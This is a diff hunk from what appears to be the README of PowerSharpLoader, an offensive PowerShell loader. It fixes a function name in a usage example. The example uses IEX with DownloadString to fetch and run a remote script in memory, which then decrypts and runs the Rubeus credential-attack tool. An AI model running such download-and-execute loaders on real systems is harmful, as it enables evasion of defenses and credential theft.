@@ -269,7 +269,7 @@ Invoke-Expression $ldrcommand
 
 ```
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssemblyAESLocal.ps1"));
-Invoke-LoadAssemblyXORLocal -AssemblyPath "C:\\Windows\\Tasks\\rubeus_aes.enc" -KeyString "Me0w_key_Me0w" -Command "hash /password:test"
+Invoke-LoadAssemblyAESLocal -AssemblyPath "C:\\Windows\\Tasks\\rubeus_aes.enc" -KeyString "Me0w_key_Me0w" -Command "hash /password:test"
 ```
 
 To encrypt an assembly binary:
